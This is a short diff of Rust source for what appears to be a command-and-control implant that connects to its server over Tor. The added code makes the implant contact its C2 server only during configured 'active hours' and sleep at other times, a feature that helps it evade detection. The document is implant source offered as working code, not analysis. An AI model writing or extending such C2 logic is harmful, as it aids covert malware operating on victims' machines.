@@ -155,6 +155,15 @@ async fn main() {
     debug_println!("tor client initialized");
 
     loop {
+        // We wish to skip reaching out to the C2 if this very moment is outside of the active hours.
+        // If active hours are disabled then it would always reach out to the C2. Otherwise it would
+        // do so only during active hours time frames.
+        if !config::get_should_be_active() {
+            debug_println!("out of active hours... sleeping");
+            helpers::wait().await;
+            continue;
+        }
+
         debug_println!("connecting to: {} {}", address.clone(), port);
 
         let mut stream = match tor_client.connect_with_prefs((address.clone(), port), &s_prefs).await {
